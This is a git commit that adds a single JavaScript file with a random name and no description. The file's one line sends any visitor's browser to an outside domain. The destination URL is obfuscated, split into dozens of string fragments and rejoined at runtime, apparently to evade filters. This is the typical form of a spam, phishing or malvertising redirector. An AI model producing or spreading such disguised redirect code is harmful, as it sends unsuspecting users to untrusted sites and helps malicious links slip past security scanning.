2a82e07018ea79753e2681013059d5dd70a75c24
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-12-21 15:00:58 +0100

    Create fgyjhcybdrthtfyjdfhftyjdrhdrtg.js

---
+++ fgyjhcybdrthtfyjdfhftyjdrhdrtg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://w`,`ww.ro`,`adswo`,`rks.co`,`m/gQ_hBEI`,`KQRfugB`,`l4Sr-C7`,`DJCnaW`,`5WzP1TI`,`xZkB8_x`,`7oLkcLEjB`,`InFikF`,`YNrN8Xb`,`shjzCV`,`oZUe1Sa`,`niKM6`,`rj2K`,`g~~/TA`,`HA/ISSAM`,`KESbGp1Wic`))
